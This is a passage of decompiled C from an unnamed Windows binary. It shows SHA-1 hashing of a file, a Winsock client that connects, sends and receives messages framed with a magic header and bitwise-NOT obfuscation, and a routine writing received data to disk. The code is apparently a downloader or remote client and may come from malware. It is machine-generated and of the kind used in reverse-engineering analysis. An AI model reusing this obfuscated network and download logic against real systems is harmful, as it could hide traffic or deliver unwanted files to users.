  uVar6 = ((uVar4 ^ uVar6) & uVar2 | uVar4 & uVar6) + uVar7 + uVar3 + -0x70e44324 +
          (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x40) = uVar7;
  uVar3 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x24);
  uVar9 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = ((uVar8 ^ uVar5) & uVar4 | uVar8 & uVar5) + uVar7 + uVar2 + -0x70e44324 +
          (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x44) = uVar7;
  uVar2 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = ((uVar9 ^ uVar6) & uVar5 | uVar9 & uVar6) + uVar7 + uVar4 + -0x70e44324 +
          (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x3c) ^
          *(uint *)(in_EAX + 0x28);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x48) = uVar7;
  uVar4 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = ((uVar2 ^ uVar8) & uVar9 | uVar2 & uVar8) + uVar7 + uVar5 + -0x70e44324 +
          (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = uVar1 ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x2c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar7;
  uVar7 = (uVar2 ^ uVar4 ^ uVar6) + uVar7 + uVar9 + -0x359d3e2a + (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar3 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar1 = uVar1 ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x1c);
  uVar6 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x44) ^
          *(uint *)(in_EAX + 0x30);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  uVar5 = *(uint *)(in_EAX + 0x58) ^ *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x20);
  *(uint *)(in_EAX + 0x50) = uVar6;
  uVar6 = (uVar4 ^ uVar3 ^ uVar8) + uVar6 + uVar2 + -0x359d3e2a + (uVar7 >> 0x1b | uVar7 * 0x20);
  uVar2 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  *(uint *)(in_EAX + 0x54) = uVar8;
  uVar8 = (uVar7 ^ uVar3 ^ uVar2) + uVar8 + uVar4 + -0x359d3e2a + (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar1 = uVar5 << 1 | (uint)((int)uVar5 < 0);
  *(uint *)(in_EAX + 0x58) = uVar1;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = (uVar7 ^ uVar6 ^ uVar2) + uVar1 + uVar3 + -0x359d3e2a + (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar1 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x24) ^
          *(uint *)(in_EAX + 0x1c);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  uVar9 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = (uVar7 ^ uVar5 ^ uVar8) + uVar1 + uVar2 + -0x359d3e2a + (uVar6 >> 0x1b | uVar6 * 0x20);
  *(uint *)(in_EAX + 0x1c) = uVar1;
  uVar1 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x20);
  uVar1 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  uVar2 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = (uVar5 ^ uVar9 ^ uVar6) + uVar1 + uVar7 + -0x359d3e2a + (uVar8 >> 0x1b | uVar8 * 0x20);
  *(uint *)(in_EAX + 0x20) = uVar1;
  uVar1 = *(uint *)(in_EAX + 0x58);
  uVar7 = uVar1 ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x2c) ^ *(uint *)(in_EAX + 0x24);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  uVar4 = uVar8 >> 2 | uVar8 * 0x40000000;
  *(uint *)(in_EAX + 0x24) = uVar7;
  uVar8 = (uVar9 ^ uVar2 ^ uVar8) + uVar7 + uVar5 + -0x359d3e2a + (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x1c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x28) = uVar7;
  uVar3 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x34) ^ *(uint *)(in_EAX + 0x2c) ^
          *(uint *)(in_EAX + 0x20);
  uVar7 = (uVar6 ^ uVar2 ^ uVar4) + uVar7 + uVar9 + -0x359d3e2a + (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar9 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = uVar3 << 1 | (uint)((int)uVar3 < 0);
  *(uint *)(in_EAX + 0x2c) = uVar6;
  uVar6 = (uVar9 ^ uVar8 ^ uVar4) + uVar6 + uVar2 + -0x359d3e2a + (uVar7 >> 0x1b | uVar7 * 0x20);
  uVar2 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x24);
  uVar8 = uVar8 << 1 | (uint)((int)uVar8 < 0);
  uVar3 = uVar7 >> 2 | uVar7 * 0x40000000;
  *(uint *)(in_EAX + 0x30) = uVar8;
  uVar8 = (uVar9 ^ uVar2 ^ uVar7) + uVar8 + uVar4 + -0x359d3e2a + (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x28);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x34) = uVar7;
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = (uVar2 ^ uVar3 ^ uVar6) + uVar7 + uVar9 + -0x359d3e2a + (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar7 = uVar1 ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x2c);
  uVar7 = uVar7 << 1 | (uint)((int)uVar7 < 0);
  *(uint *)(in_EAX + 0x38) = uVar7;
  uVar4 = *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x3c) ^ *(uint *)(in_EAX + 0x30) ^
          *(uint *)(in_EAX + 0x1c);
  uVar9 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar4 = uVar4 << 1 | (uint)((int)uVar4 < 0);
  uVar8 = (uVar3 ^ uVar5 ^ uVar8) + uVar7 + uVar2 + -0x359d3e2a + (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = (uVar6 ^ uVar5 ^ uVar9) + uVar4 + uVar3 + -0x359d3e2a + (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar3 = uVar6 >> 2 | uVar6 * 0x40000000;
  *(uint *)(in_EAX + 0x3c) = uVar4;
  uVar6 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x20);
  uVar6 = uVar6 << 1 | (uint)((int)uVar6 < 0);
  *(uint *)(in_EAX + 0x40) = uVar6;
  uVar6 = (uVar3 ^ uVar8 ^ uVar9) + uVar6 + uVar5 + -0x359d3e2a + (uVar7 >> 0x1b | uVar7 * 0x20);
  uVar2 = *(uint *)(in_EAX + 0x4c) ^ *(uint *)(in_EAX + 0x44) ^ *(uint *)(in_EAX + 0x38) ^
          *(uint *)(in_EAX + 0x24);
  uVar4 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar8 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x44) = uVar8;
  uVar8 = (uVar3 ^ uVar4 ^ uVar7) + uVar8 + uVar9 + -0x359d3e2a + (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar2 = *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x28) ^
          *(uint *)(in_EAX + 0x3c);
  uVar5 = uVar7 >> 2 | uVar7 * 0x40000000;
  uVar7 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x48) = uVar7;
  uVar2 = *(uint *)(in_EAX + 0x40) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x4c) ^
          *(uint *)(in_EAX + 0x2c);
  uVar9 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar6 = (uVar4 ^ uVar5 ^ uVar6) + uVar7 + uVar3 + -0x359d3e2a + (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar7 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x4c) = uVar7;
  uVar3 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar2 = uVar1 ^ *(uint *)(in_EAX + 0x50) ^ *(uint *)(in_EAX + 0x30) ^ *(uint *)(in_EAX + 0x44);
  uVar8 = (uVar5 ^ uVar9 ^ uVar8) + uVar7 + uVar4 + -0x359d3e2a + (uVar6 >> 0x1b | uVar6 * 0x20);
  uVar7 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x50) = uVar7;
  uVar2 = *(uint *)(in_EAX + 0x48) ^ *(uint *)(in_EAX + 0x54) ^ *(uint *)(in_EAX + 0x34) ^
          *(uint *)(in_EAX + 0x1c);
  uVar1 = uVar1 ^ *(uint *)(in_EAX + 0x38) ^ *(uint *)(in_EAX + 0x20) ^ *(uint *)(in_EAX + 0x4c);
  uVar7 = (uVar6 ^ uVar9 ^ uVar3) + uVar7 + uVar5 + -0x359d3e2a + (uVar8 >> 0x1b | uVar8 * 0x20);
  uVar5 = uVar6 >> 2 | uVar6 * 0x40000000;
  uVar2 = uVar2 << 1 | (uint)((int)uVar2 < 0);
  *(uint *)(in_EAX + 0x54) = uVar2;
  uVar4 = uVar8 >> 2 | uVar8 * 0x40000000;
  uVar6 = uVar1 << 1 | (uint)((int)uVar1 < 0);
  uVar8 = (uVar5 ^ uVar8 ^ uVar3) + uVar2 + uVar9 + -0x359d3e2a + (uVar7 >> 0x1b | uVar7 * 0x20);
  *(uint *)(in_EAX + 0x58) = uVar6;
  *(int *)(in_EAX + 0xc) = *(int *)(in_EAX + 0xc) + uVar8;
  *(int *)(in_EAX + 8) =
       *(int *)(in_EAX + 8) +
       (uVar5 ^ uVar4 ^ uVar7) + uVar6 + uVar3 + -0x359d3e2a + (uVar8 >> 0x1b | uVar8 * 0x20);
  *(int *)(in_EAX + 0x14) = *(int *)(in_EAX + 0x14) + uVar4;
  *(int *)(in_EAX + 0x10) = *(int *)(in_EAX + 0x10) + (uVar7 >> 2 | uVar7 * 0x40000000);
  *(int *)(in_EAX + 0x18) = *(int *)(in_EAX + 0x18) + uVar5;
  return;
}



void __thiscall FUN_00404ea0(void *this,uint param_1,uint *param_2)

{
  uint uVar1;
  uint *puVar2;
  int iVar3;
  size_t _Size;
  uint uVar4;
  void *local_8;
  
  uVar4 = *param_2 & 0x3f;
  uVar1 = *param_2 + param_1;
  _Size = 0x40 - uVar4;
  *param_2 = uVar1;
  if (uVar1 < param_1) {
    param_2[1] = param_2[1] + 1;
  }
  local_8 = this;
  if (_Size <= param_1) {
    do {
      FID_conflict__memcpy((void *)((int)param_2 + uVar4 + 0x1c),local_8,_Size);
      local_8 = (void *)((int)local_8 + _Size);
      param_1 = param_1 - _Size;
      _Size = 0x40;
      uVar4 = 0;
      iVar3 = 0x10;
      puVar2 = param_2 + 0x17;
      do {
        uVar1 = puVar2[-1];
        puVar2 = puVar2 + -1;
        iVar3 = iVar3 + -1;
        *puVar2 = uVar1 >> 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18;
      } while (iVar3 != 0);
      FUN_00403e10();
    } while (0x3f < param_1);
  }
  FID_conflict__memcpy((void *)(uVar4 + 0x1c + (int)param_2),local_8,param_1);
  return;
}



void __cdecl FUN_00404f40(int param_1)

{
  uint uVar1;
  sbyte sVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  uint *puVar6;
  uint *unaff_ESI;
  uint uVar7;
  
  uVar3 = *unaff_ESI;
  uVar7 = uVar3 & 0x3f;
  uVar4 = uVar7 + 3 >> 2;
  if (uVar4 != 0) {
    puVar6 = (uint *)((int)unaff_ESI + (uVar7 + 3 & 0xfffffffc) + 0x1c);
    do {
      uVar1 = puVar6[-1];
      puVar6 = puVar6 + -1;
      uVar4 = uVar4 - 1;
      *puVar6 = uVar1 >> 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18;
    } while (uVar4 != 0);
  }
  sVar2 = (~(byte)uVar7 & 3) * '\b';
  *(uint *)((int)unaff_ESI + (uVar3 & 0x3c) + 0x1c) =
       -0x80 << sVar2 & *(uint *)((int)unaff_ESI + (uVar3 & 0x3c) + 0x1c) | 0x80 << sVar2;
  if (uVar7 < 0x38) {
    uVar3 = (uVar7 >> 2) + 1;
    if (0xd < uVar3) goto LAB_00404fd3;
  }
  else {
    if (uVar7 < 0x3c) {
      unaff_ESI[0x16] = 0;
    }
    FUN_00403e10();
    uVar3 = 0;
  }
  puVar6 = unaff_ESI + uVar3 + 7;
  for (iVar5 = 0xe - uVar3; iVar5 != 0; iVar5 = iVar5 + -1) {
    *puVar6 = 0;
    puVar6 = puVar6 + 1;
  }
LAB_00404fd3:
  unaff_ESI[0x16] = *unaff_ESI * 8;
  unaff_ESI[0x15] = unaff_ESI[1] * 8 | *unaff_ESI >> 0x1d;
  FUN_00403e10();
  uVar3 = 0;
  do {
    uVar4 = uVar3 + 1;
    *(char *)(uVar3 + param_1) =
         (char)(*(uint *)((int)unaff_ESI + (uVar3 & 0xfffffffc) + 8) >> (~(byte)uVar3 & 3) * '\b');
    uVar3 = uVar4;
  } while (uVar4 < 0x14);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void __cdecl FUN_00405030(wchar_t *param_1)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *unaff_EDI;
  FILE *local_1068;
  uint local_1064;
  undefined4 local_1060;
  undefined4 local_105c;
  undefined4 local_1058;
  undefined4 local_1054;
  undefined4 local_1050;
  undefined4 local_104c;
  undefined local_1008 [4096];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  uVar3 = 0;
  local_1068 = (FILE *)0x0;
  __wfopen_s(&local_1068,param_1,(wchar_t *)&DAT_0041c3f0);
  if (local_1068 != (FILE *)0x0) {
    _fseek(local_1068,0,2);
    uVar1 = _ftell(local_1068);
    _fseek(local_1068,0,0);
    local_1060 = 0;
    local_1064 = 0;
    local_105c = 0x67452301;
    local_1058 = 0xefcdab89;
    local_1054 = 0x98badcfe;
    local_1050 = 0x10325476;
    local_104c = 0xc3d2e1f0;
    uVar2 = _fread(local_1008,1,0x1000,local_1068);
    while (uVar2 != 0) {
      FUN_00404ea0(local_1008,uVar2,&local_1064);
      uVar3 = uVar3 + uVar2;
      uVar2 = _fread(local_1008,1,0x1000,local_1068);
    }
    FUN_00404f40((int)unaff_EDI);
    _fclose(local_1068);
    if (uVar1 <= uVar3) {
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
  }
  *unaff_EDI = 0;
  unaff_EDI[1] = 0;
  unaff_EDI[2] = 0;
  unaff_EDI[3] = 0;
  unaff_EDI[4] = 0;
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __thiscall FUN_004051a0(void *this,undefined4 param_1,undefined4 param_2)

{
  int iVar1;
  int *unaff_EBX;
  wchar_t *_Dst;
  wchar_t *_Src;
  undefined4 local_9b0;
  undefined local_9ac [400];
  undefined2 local_81c;
  undefined2 local_81a;
  undefined4 local_818;
  wchar_t local_80c;
  undefined local_80a [2050];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_80c = L'\0';
  _memset(local_80a,0,0x7fe);
  _Dst = &local_80c;
  if (this != (void *)0x0) {
    _Dst = (wchar_t *)this;
  }
  *_Dst = L'\0';
  local_9b0 = 0;
  iVar1 = Ordinal_115(0x101,local_9ac);
  if (iVar1 != 0) {
LAB_00405213:
    _wcscpy_s(_Dst,0x3ff,(wchar_t *)&LAB_0041c490);
    _wcscat_s(_Dst,0x3ff,(wchar_t *)&DAT_0041c4b0);
    _wcscat_s(_Dst,0x3ff,(wchar_t *)&LAB_0041c4b4);
    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  iVar1 = Ordinal_23(2,1,6);
  *unaff_EBX = iVar1;
  if (iVar1 == -1) goto LAB_00405213;
  iVar1 = Ordinal_52(param_1);
  if (iVar1 == 0) {
    local_9b0 = Ordinal_11(param_1);
    iVar1 = Ordinal_51(&local_9b0,4,2);
    if (iVar1 == 0) {
      _Src = (wchar_t *)&LAB_0041c490;
      goto LAB_004052a3;
    }
  }
  local_818 = *(undefined4 *)**(undefined4 **)(iVar1 + 0xc);
  local_81c = 2;
  local_81a = Ordinal_9(param_2);
  iVar1 = Ordinal_4(*unaff_EBX,&local_81c,0x10);
  if (iVar1 == 0) {
    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  _Src = (wchar_t *)&DAT_0041c4f4;
LAB_004052a3:
  _wcscpy_s(_Dst,0x3ff,_Src);
  _wcscat_s(_Dst,0x3ff,(wchar_t *)&DAT_0041c4b0);
  _wcscat_s(_Dst,0x3ff,(wchar_t *)&LAB_0041c4b4);
  if (*unaff_EBX != 0) {
    Ordinal_3(*unaff_EBX);
    *unaff_EBX = 0;
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 __cdecl FUN_00405370(int *param_1,void *param_2)

{
  uint uVar1;
  int iVar2;
  int *piVar3;
  uint uVar4;
  size_t unaff_EDI;
  undefined4 local_8;
  
  iVar2 = 0;
  local_8 = 0;
  if (*param_1 != 0) {
    if (0 < (int)unaff_EDI) {
      do {
        *(byte *)(iVar2 + (int)param_2) = ~*(byte *)(iVar2 + (int)param_2);
        iVar2 = iVar2 + 1;
      } while (iVar2 < (int)unaff_EDI);
    }
    uVar1 = unaff_EDI + 7;
    piVar3 = (int *)operator_new(uVar1);
    *(short *)piVar3 = (short)unaff_EDI + 5;
    *(undefined4 *)((int)piVar3 + 2) = DAT_00420f90;
    *(undefined *)((int)piVar3 + 6) = DAT_00420f94;
    FID_conflict__memcpy((void *)((int)piVar3 + 7),param_2,unaff_EDI);
    uVar4 = Ordinal_19(*param_1,piVar3,uVar1,0);
    param_1 = piVar3;
    if ((uVar4 != 0xffffffff) && (uVar4 == uVar1)) {
      local_8 = 1;
    }
  }
  if (param_1 != (int *)0x0) {
    FUN_0040a83e(param_1);
  }
  return local_8;
}



void __fastcall
FUN_00405410(undefined4 param_1,int *param_2,undefined2 param_3,undefined2 *param_4,size_t param_5,
            undefined2 *param_6)

{
  undefined2 *puVar1;
  int iVar2;
  size_t _Size;
  size_t _Size_00;
  undefined2 local_808 [1024];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  puVar1 = local_808;
  if (param_6 != (undefined2 *)0x0) {
    puVar1 = param_6;
  }
  *puVar1 = 0;
  puVar1 = param_4;
  if (*param_2 != 0) {
    if (0xfffa < (int)param_5) {
      param_5 = 0xfffa;
    }
    puVar1 = (undefined2 *)operator_new(0x1000);
    _Size = param_5;
    if (0xffa < (int)param_5) {
      _Size = 0xffa;
    }
    *puVar1 = param_3;
    *(size_t *)(puVar1 + 1) = param_5;
    if ((param_4 == (undefined2 *)0x0) && (param_5 == 0)) {
      FUN_00405370(param_2,puVar1);
    }
    else {
      FID_conflict__memcpy(puVar1 + 3,param_4,_Size);
      iVar2 = FUN_00405370(param_2,puVar1);
      if (iVar2 != 0) {
        for (; (int)_Size < (int)param_5; _Size = _Size + _Size_00) {
          _Size_00 = param_5 - _Size;
          if (0x1000 < (int)_Size_00) {
            _Size_00 = 0x1000;
          }
          FID_conflict__memcpy(puVar1,(void *)((int)param_4 + _Size),_Size_00);
          iVar2 = FUN_00405370(param_2,puVar1);
          if (iVar2 == 0) break;
        }
      }
    }
  }
  if (puVar1 != (undefined2 *)0x0) {
    FUN_0040a83e(puVar1);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __fastcall FUN_00405570(size_t *param_1,int *param_2,void *param_3,wchar_t *param_4)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  byte *pbVar4;
  size_t _Size;
  uint uVar5;
  size_t sVar6;
  wchar_t *local_8d8;
  wchar_t local_8d0;
  undefined local_8ce [2046];
  undefined2 local_d0;
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_8d0 = L'\0';
  _memset(local_8ce,0,0x7fe);
  local_8d8 = &local_8d0;
  if (param_4 != (wchar_t *)0x0) {
    local_8d8 = param_4;
  }
  *local_8d8 = L'\0';
  iVar1 = *param_2;
  if ((iVar1 != 0) && (param_3 != (void *)0x0)) {
    local_d0 = local_d0 & 0xff00;
    _memset((void *)((int)&local_d0 + 1),0,199);
    iVar1 = Ordinal_16(iVar1,&local_d0,2,0);
    if ((iVar1 == -1) || (iVar1 == 0)) {
      _wcscpy_s(local_8d8,0x3ff,(wchar_t *)&DAT_0041c518);
      ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
      return;
    }
    uVar5 = (uint)local_d0;
    iVar1 = 0;
    piVar2 = (int *)operator_new(uVar5 + 2);
    if (uVar5 != 0) {
      do {
        iVar3 = Ordinal_16(*param_2,iVar1 + (int)piVar2,uVar5 - iVar1,0);
        if ((iVar3 == -1) || (iVar3 == 0)) {
          _wcscpy_s(local_8d8,0x3ff,(wchar_t *)&DAT_0041c518);
          Ordinal_111();
          goto LAB_00405708;
        }
        iVar1 = iVar1 + iVar3;
      } while (iVar1 < (int)uVar5);
      if (4 < iVar1) {
        _Size = iVar1 - 5;
        if ((DAT_00420f90 == *piVar2) && (*(char *)(piVar2 + 1) == DAT_00420f94)) {
          if (0 < (int)_Size) {
            pbVar4 = (byte *)((int)piVar2 + 5);
            sVar6 = _Size;
            do {
              *pbVar4 = ~*pbVar4;
              pbVar4 = pbVar4 + 1;
              sVar6 = sVar6 - 1;
            } while (sVar6 != 0);
          }
          if ((int)*param_1 < (int)_Size) {
            FID_conflict__memcpy(param_3,(void *)((int)piVar2 + 5),*param_1);
          }
          else {
            FID_conflict__memcpy(param_3,(void *)((int)piVar2 + 5),_Size);
            *param_1 = _Size;
          }
        }
        else {
          _wcscpy_s(local_8d8,0x3ff,(wchar_t *)&DAT_0041c518);
        }
      }
    }
LAB_00405708:
    if (piVar2 != (int *)0x0) {
      FUN_0040a83e(piVar2);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __fastcall
FUN_004057a0(void *param_1,size_t *param_2,int *param_3,undefined2 *param_4,wchar_t *param_5)

{
  size_t sVar1;
  size_t sVar2;
  size_t sVar3;
  size_t _Size;
  undefined2 *_Src;
  int iVar4;
  int iVar5;
  size_t _Size_00;
  size_t sVar6;
  wchar_t *local_81c;
  size_t local_80c;
  wchar_t local_808;
  undefined local_806 [2046];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_808 = L'\0';
  _memset(local_806,0,0x7fe);
  local_81c = &local_808;
  if (param_5 != (wchar_t *)0x0) {
    local_81c = param_5;
  }
  *local_81c = L'\0';
  if ((*param_3 != 0) && (param_1 != (void *)0x0)) {
    local_80c = 0x1000;
    _Src = (undefined2 *)operator_new(0x1000);
    iVar4 = FUN_00405570(&local_80c,param_3,_Src,local_81c);
    sVar6 = local_80c;
    if ((iVar4 != 0) && (_Size_00 = local_80c - 6, -1 < (int)_Size_00)) {
      *param_4 = *_Src;
      sVar6 = *param_2;
      iVar4 = *(int *)(_Src + 1);
      if ((int)sVar6 < (int)_Size_00) {
        sVar3 = 0;
        if (0 < (int)sVar6) {
          FID_conflict__memcpy(param_1,_Src + 3,sVar6);
          sVar3 = *param_2;
        }
      }
      else {
        FID_conflict__memcpy(param_1,_Src + 3,_Size_00);
        sVar3 = _Size_00;
      }
      while ((int)_Size_00 < iVar4) {
        local_80c = 0x1000;
        iVar5 = FUN_00405570(&local_80c,param_3,_Src,local_81c);
        _Size = local_80c;
        sVar6 = local_80c;
        if ((iVar5 == 0) || (sVar6 = _Size_00 + local_80c, 0x10000 < (int)sVar6)) goto LAB_00405988;
        sVar2 = *param_2;
        sVar1 = sVar3 + local_80c;
        local_80c = sVar6;
        if ((int)sVar2 < (int)sVar1) {
          _Size_00 = sVar6;
          if ((int)sVar3 < (int)sVar2) {
            FID_conflict__memcpy((void *)((int)param_1 + sVar3),_Src,sVar2 - sVar3);
            sVar3 = *param_2;
            _Size_00 = local_80c;
          }
        }
        else {
          FID_conflict__memcpy((void *)((int)param_1 + sVar3),_Src,_Size);
          _Size_00 = local_80c;
          sVar3 = sVar1;
        }
      }
      *param_2 = sVar3;
      sVar6 = local_80c;
    }
LAB_00405988:
    local_80c = sVar6;
    if (_Src != (undefined2 *)0x0) {
      FUN_0040a83e(_Src);
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void __cdecl FUN_004059b0(FILE **param_1)

{
  int iVar1;
  size_t _Count;
  undefined4 *unaff_EBX;
  uint uVar2;
  uint local_100c;
  undefined local_1008 [4096];
  uint local_8;
  
  local_8 = DAT_00420044 ^ (uint)&stack0xfffffffc;
  uVar2 = 0;
  iVar1 = Ordinal_16(*unaff_EBX,&local_100c,4,0);
  if (iVar1 != 4) {
    ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
    return;
  }
  if (local_100c != 0) {
    do {
      _Count = Ordinal_16(*unaff_EBX,local_1008,0x1000,0);
      if (_Count == 0) break;
      _fwrite(local_1008,1,_Count,*param_1);
      uVar2 = uVar2 + _Count;
      _DAT_004227d8 = uVar2;
    } while (uVar2 < local_100c);
  }
  _fclose(*param_1);
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void __thiscall FUN_00405a80(void *this,undefined4 param_1)

{
  wchar_t *_Src;
  void *_Dst;
  uint uVar1;
  int iVar2;
  undefined4 *puVar3;
  size_t sVar4;
  ushort uVar5;
  undefined4 *puVar6;
  size_t local_c24;
  void *local_c20;
  int local_c1c;
  uint local_c18;
  undefined4 local_c14;
  undefined4 local_c10 [256];
  wchar_t local_810;
  undefined local_80e [2050];
  uint local_c;
  
  local_c = DAT_00420044 ^ (uint)&stack0xfffffffc;
  local_c14 = 0;
  puVar3 = &DAT_00423620;
  puVar6 = local_c10;
  for (iVar2 = 0x80; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar6 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar6 = puVar6 + 1;
  }
  _Dst = _malloc(0x10000);
  local_c20 = _Dst;
  _memset(_Dst,0,0x10000);
  local_c24 = 0x10000;
  local_810 = L'\0';
  _memset(local_80e,0,0x7fe);
  local_c1c = 0;
  local_c18 = 0;
  iVar2 = FUN_004051a0(&local_810,this,param_1);
  if (iVar2 == 0) {
    local_c14 = 1;
  }
  else {
    iVar2 = FUN_00405410(local_c10,&local_c1c,0xbb9,(undefined2 *)local_c10,0x200,&local_810);
    if (iVar2 == 0) {
      local_c14 = 3;
    }
    else {
      if (_Dst == (void *)0x0) goto LAB_00405c8f;
      iVar2 = FUN_004057a0(_Dst,&local_c24,&local_c1c,(undefined2 *)&local_c18,&local_810);
      sVar4 = local_c24;
      if (((iVar2 == 0) || ((short)local_c18 != 0xbb9)) || (local_c24 == 0)) {
        local_c14 = 2;
      }
      else {
        _memset(&DAT_004227e0,0,0x578);
        uVar5 = 0;
        local_c18 = 0;
        _Dst = local_c20;
